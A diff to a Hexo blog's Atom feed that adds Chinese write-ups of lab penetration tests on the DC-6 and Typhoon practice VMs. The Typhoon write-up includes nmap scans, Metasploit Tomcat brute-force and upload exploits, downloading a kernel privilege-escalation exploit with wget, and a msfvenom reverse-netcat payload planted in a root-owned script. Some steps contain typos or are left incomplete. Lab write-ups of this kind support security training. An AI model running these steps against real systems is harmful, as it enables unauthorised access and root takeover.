@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://pgg666.org/"/>
-  <updated>2019-05-31T09:10:58.792Z</updated>
+  <updated>2019-06-01T14:31:14.144Z</updated>
   <id>https://pgg666.org/</id>
   
   <author>
@@ -15,6 +15,27 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>DC系列  对WORDY的一次入侵检测</title>
+    <link href="https://pgg666.org/2019/06/01/%E5%AF%B9wordy%E7%9A%84%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/"/>
+    <id>https://pgg666.org/2019/06/01/对wordy的入侵检测/</id>
+    <published>2019-05-31T16:00:00.000Z</published>
+    <updated>2019-06-01T14:31:14.144Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="今天六一-祝各位小哥哥姐姐们开心"><a href="#今天六一-祝各位小哥哥姐姐们开心" class="headerlink" title="####今天六一##祝各位小哥哥姐姐们开心"></a>####今天六一##祝各位小哥哥姐姐们开心</h1><h2 id="DC系列-dc-6"><a href="#DC系列-dc-6" class="headerlink" title="#DC系列   dc-6"></a>#DC系列   dc-6</h2><p><strong>dc-6：   <a href="http://www.five86.com/dc-6.html" target="_blank" rel="noopener">http://www.five86.com/dc-6.html</a></strong></p><p><strong>ip:   192.168.0.168</strong></p><h4 id="1-首先先扫描它的端口-nmap-–sV-–p-A-192-168-0-168"><a href="#1-首先先扫描它的端口-nmap-–sV-–p-A-192-168-0-168" class="headerlink" title="1.  首先先扫描它的端口    nmap –sV –p- -A 192.168.0.168"></a>1.  首先先扫描它的端口    nmap –sV –p- -A 192.168.0.168</h4><p>111111111</p><h4 id="2-有-80端口-我们扫一下目录"><a href="#2-有-80端口-我们扫一下目录" class="headerlink" title="2.  有 80端口  我们扫一下目录"></a>2.  有 80端口  我们扫一下目录</h4><p>2222222</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;今天六一-祝各位小哥哥姐姐们开心&quot;&gt;&lt;a href=&quot;#今天六一-祝各位小哥哥姐姐们开心&quot; class=&quot;headerlink&quot; title=&quot;####今天六一##祝各位小哥哥姐姐们开心&quot;&gt;&lt;/a&gt;####今天六一##祝各位小哥哥姐姐们开心&lt;/h1&gt;&lt;h2 id=
+      
+    
+    </summary>
+    
+    
+  </entry>
   
   <entry>
     <title>一次系统的内网渗透测试</title>
@@ -84,9 +105,16 @@
     <link href="https://pgg666.org/2019/05/20/%E5%AF%B9Typhoon%E7%9A%84%E4%B8%80%E6%AC%A1%E5%85%A5%E4%BE%B5/"/>
     <id>https://pgg666.org/2019/05/20/对Typhoon的一次入侵/</id>
     <published>2019-05-19T16:00:00.000Z</published>
-    <updated>2019-05-20T15:34:05.993Z</updated>
+    <updated>2019-06-01T10:21:38.736Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="对Typhoon的一次入侵"><a href="#对Typhoon的一次入侵" class="headerlink" title="对Typhoon的一次入侵"></a>对Typhoon的一次入侵</h1><p><em>老师开了搭建了一个网站让我们尝试入侵  Ip为：192.168.0.159 ，首先我先访问看看</em></p><p><img src="http://kan.027cgb.com/613977/对Typhoon的一次入侵/1.png"></p><h4 id="1-首先看到这个网站，我习惯性的是先扫描一下它的目录-，再扫描一下它的端口"><a href="#1-首先看到这个网站，我习惯性的是先扫描一下它的目录-，再扫描一下它的端口" class="headerlink" title="1.  首先看到这个网站，我习惯性的是先扫描一下它的目录 ，再扫描一下它的端口"></a>1.  首先看到这个网站，我习惯性的是先扫描一下它的目录 ，再扫描一下它的端口</h4><p><img src="http://kan.027cgb.com/613977/对Typhoon的一次入侵/image2.png"></p><p>nmap -sV -p- -A -Pn    </p><p>nmap -sS -sV -A –O</p><p>nmap –A  </p><p>21(ftp),</p><p>· 22(ssh),</p><p>· 25(smtp),</p><p>· 53(domain),</p><p>· 80(http),</p><p>· 110(pop3)</p><p>· 111(rpcbind)</p><p>· 139(netbios-ssn)</p><p>· 143(imap)</p><p>· 445(netbios-ssn)</p><p>· 631(ipp)</p><p>· 993(ssl/imaps),</p><p>· 995(ssl/pop3)</p><p>· 2049(nfs_acl)</p><p>· 3306(mysql),</p><p>· 5432(postgrespl)</p><p>· 8080(http)</p><p>如图：</p><p><img src="http://kan.027cgb.com/613977/对Typhoon的一次入侵/image3.png"></p><p>在图中，可以看到robots.txt文件中/monoadmin这个目录禁止访问，这个目录可能会有用。我们还注意到8080端口也开放了，对应的服务是Apache Tomcat，使用的引擎是Coyote JSP engine1.1。这可能是另外一种渗透靶机的方法，我们一会儿再来看看。</p><h4 id="2-发现有个robots-txt目录-我们去访问看看"><a href="#2-发现有个robots-txt目录-我们去访问看看" class="headerlink" title="2.  发现有个robots.txt目录 我们去访问看看"></a>2.  发现有个robots.txt目录 我们去访问看看</h4><p><img src="http://kan.027cgb.com/613977/对Typhoon的一次入侵/image4.png"></p><h4 id="3-有个目录，我们去访问看看"><a href="#3-有个目录，我们去访问看看" class="headerlink" title="3.   有个目录，我们去访问看看"></a>3.   有个目录，我们去访问看看</h4><p><img src="http://kan.027cgb.com/613977/对Typhoon的一次入侵/image5.png"></p><p><img src="http://kan.027cgb.com/613977/对Typhoon的一次入侵/image6.png"></p><h4 id="4-这里我们设置-change-database为credentials-84mb-，它会显示2个凭证的链接，我们点击一下这个链接，竟然显示出了用户名和密码，用户名是typhoon，密码是78945"><a href="#4-这里我们设置-change-database为credentials-84mb-，它会显示2个凭证的链接，我们点击一下这个链接，竟然显示出了用户名和密码，用户名是typhoon，密码是78945" class="headerlink" title="4.这里我们设置 change database为credentials(84mb)，它会显示2个凭证的链接，我们点击一下这个链接，竟然显示出了用户名和密码，用户名是typhoon，密码是78945"></a>4.这里我们设置 change database为credentials(84mb)，它会显示2个凭证的链接，我们点击一下这个链接，竟然显示出了用户名和密码，用户名是typhoon，密码是78945</h4><h4 id="5-开放了22端口，那我们就用ssh试试"><a href="#5-开放了22端口，那我们就用ssh试试" class="headerlink" title="5. 开放了22端口，那我们就用ssh试试"></a>5. 开放了22端口，那我们就用ssh试试</h4><p><img src="http://kan.027cgb.com/613977/对Typhoon的一次入侵/image7.png"></p><h4 id="6-登录上来了，我们现在发现它的操作系统是Ubuntu-14-04-我们现在用searchsploit-搜索一下Ubuntu的提权exp"><a href="#6-登录上来了，我们现在发现它的操作系统是Ubuntu-14-04-我们现在用searchsploit-搜索一下Ubuntu的提权exp" class="headerlink" title="6.  登录上来了，我们现在发现它的操作系统是Ubuntu 14.04   我们现在用searchsploit 搜索一下Ubuntu的提权exp"></a>6.  登录上来了，我们现在发现它的操作系统是Ubuntu 14.04   我们现在用searchsploit 搜索一下Ubuntu的提权exp</h4><p><img src="http://kan.027cgb.com/613977/对Typhoon的一次入侵/image8.png"></p><h4 id="7-我们随便使用17292-c的exp去打它-先下载到本地kail上-命令：-searchsploit-–m-37292-，然后使用python启动一个服务器，然后靶机进-tmp目录下载-启动服务器命令-：python-–m-SimpleHTTPServer-8000-下载命令-：wget-http-192-168-0-159-37292-c"><a href="#7-我们随便使用17292-c的exp去打它-先下载到本地kail上-命令：-searchsploit-–m-37292-，然后使用python启动一个服务器，然后靶机进-tmp目录下载-启动服务器命令-：python-–m-SimpleHTTPServer-8000-下载命令-：wget-http-192-168-0-159-37292-c" class="headerlink" title="7.  我们随便使用17292.c的exp去打它   先下载到本地kail上  命令： searchsploit –m 37292 ，然后使用python启动一个服务器，然后靶机进 tmp目录下载    启动服务器命令 ：python –m SimpleHTTPServer 8000    下载命令 ：wget http://192.168.0.159/37292.c"></a>7.  我们随便使用17292.c的exp去打它   先下载到本地kail上  命令： searchsploit –m 37292 ，然后使用python启动一个服务器，然后靶机进 tmp目录下载    启动服务器命令 ：python –m SimpleHTTPServer 8000    下载命令 ：wget <a href="http://192.168.0.159/37292.c" target="_blank" rel="noopener">http://192.168.0.159/37292.c</a></h4><p><img src="http://kan.027cgb.com/613977/对Typhoon的一次入侵/image9.png"></p><p><img src="http://kan.027cgb.com/613977/对Typhoon的一次入侵/image10.png"></p><h4 id="8-编译exp并赋予权限，然后执行，成功提到root"><a href="#8-编译exp并赋予权限，然后执行，成功提到root" class="headerlink" title="8.  编译exp并赋予权限，然后执行，成功提到root"></a>8.  编译exp并赋予权限，然后执行，成功提到root</h4><p><img src="http://kan.027cgb.com/613977/对Typhoon的一次入侵/image11.png"></p><h5 id="发现这个网站并没有那么简单，我们来换几种方式来入侵试试"><a href="#发现这个网站并没有那么简单，我们来换几种方式来入侵试试" class="headerlink" title="发现这个网站并没有那么简单，我们来换几种方式来入侵试试"></a>发现这个网站并没有那么简单，我们来换几种方式来入侵试试</h5><h4 id="1-前面通过扫描知道了8080端口是开放的，而且开放了Apache-Tomcat服务，直接在浏览器中访问8080端口看看，如图"><a href="#1-前面通过扫描知道了8080端口是开放的，而且开放了Apache-Tomcat服务，直接在浏览器中访问8080端口看看，如图" class="headerlink" title="1.  前面通过扫描知道了8080端口是开放的，而且开放了Apache Tomcat服务，直接在浏览器中访问8080端口看看，如图"></a>1.  前面通过扫描知道了8080端口是开放的，而且开放了Apache Tomcat服务，直接在浏览器中访问8080端口看看，如图</h4><p><img src="http://kan.027cgb.com/613977/对Typhoon的一次入侵/image12.png"></p><h4 id="2-发现"><a href="#2-发现" class="headerlink" title="2. 发现"></a>2. 发现</h4><ol><li><h4 id="需要登录，于是想用msf测试存在账号密码"><a href="#需要登录，于是想用msf测试存在账号密码" class="headerlink" title="需要登录，于是想用msf测试存在账号密码"></a>需要登录，于是想用msf测试存在账号密码</h4></li></ol><p>命令：use auxiliary/scanner/http/tomcat_mgr_login</p><p><img src="http://kan.027cgb.com/613977/对Typhoon的一次入侵/image13.png"></p><h4 id="3-得到账号密码："><a href="#3-得到账号密码：" class="headerlink" title="3.  得到账号密码："></a>3.  得到账号密码：</h4><h4 id="username-tomcat-password-tomcat-利用mgr-upload漏洞"><a href="#username-tomcat-password-tomcat-利用mgr-upload漏洞" class="headerlink" title="username:tomcat   password:tomcat   利用mgr_upload漏洞"></a>username:tomcat   password:tomcat   利用mgr_upload漏洞</h4><p>命令： use exploit/multi/http/tomcat_mgr_upload</p><p><img src="http://kan.027cgb.com/613977/对Typhoon的一次入侵/image14.png"></p><h4 id="4-进来之后发现是一个python-shell"><a href="#4-进来之后发现是一个python-shell" class="headerlink" title="4. 进来之后发现是一个python shell ,"></a>4. 进来之后发现是一个python shell ,</h4><p>使用命令：python –c ‘import pty;pty.spawn(“/bin/bash”)’</p><p><img src="http://kan.027cgb.com/613977/对Typhoon的一次入侵/image15.png"></p><h4 id="5-在-tab目录下有一个script-sh文件，所有者是root，并拥有所有权限"><a href="#5-在-tab目录下有一个script-sh文件，所有者是root，并拥有所有权限" class="headerlink" title="5.  在/tab目录下有一个script.sh文件，所有者是root，并拥有所有权限"></a>5.  在/tab目录下有一个script.sh文件，所有者是root，并拥有所有权限</h4><p>我们使用msfcenom来生成一段bash code 插入恶意代码到这个文件中</p><p>命令：msfvenom –p cmd/unix/reverse_netcat lhost=192.168.0.159 lport=4455 R</p><p><img src="http://kan.027cgb.com/613977/对Typhoon的一次入侵/image16.png"></p><p><img src="http://kan.027cgb.com/613977/对Typhoon的一次入侵/image17.png"></p><h4 id="6-我们将恶意代码插入到文件中-命令-echo-“xxxxxxxxxxxxxxx”-gt-script-sh"><a href="#6-我们将恶意代码插入到文件中-命令-echo-“xxxxxxxxxxxxxxx”-gt-script-sh" class="headerlink" title="6.  我们将恶意代码插入到文件中 命令  echo “xxxxxxxxxxxxxxx”&gt;script.sh"></a>6.  我们将恶意代码插入到文件中 命令  echo “xxxxxxxxxxxxxxx”&gt;script.sh</h4><p><img src="http://kan.027cgb.com/613977/对Typhoon的一次入侵/image18.png"></p><h4 id="7-执行后，我们去msf里监听就好了-命令：use-exploit-multi-handler"><a href="#7-执行后，我们去msf里监听就好了-命令：use-exploit-multi-handler" class="headerlink" title="7.  执行后，我们去msf里监听就好了  命令：use exploit/multi/handler"></a>7.  执行后，我们去msf里监听就好了  命令：use exploit/multi/handler</h4><p><img src="http://kan.027cgb.com/613977/对Typhoon的一次入侵/image19.png"></p><h5 id="sud-u-jens-绝对路径"><a href="#sud-u-jens-绝对路径" class="headerlink" title="sud -u jens  绝对路径"></a>sud -u jens  绝对路径</h5>]]></content>
     
     <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;对Typhoon的一次入侵&quot;&gt;&lt;a href=&quot;#对Typhoon的一次入侵&quot; class=&quot;headerlink&quot; title=&quot;对Typhoon的一次入侵&quot;&gt;&lt;/a&gt;对Typhoon的一次入侵&lt;/h1&gt;&lt;p&gt;&lt;em&gt;老师开了搭建了一个网站让我们尝试入侵  Ip
+      
     
     </summary>
     
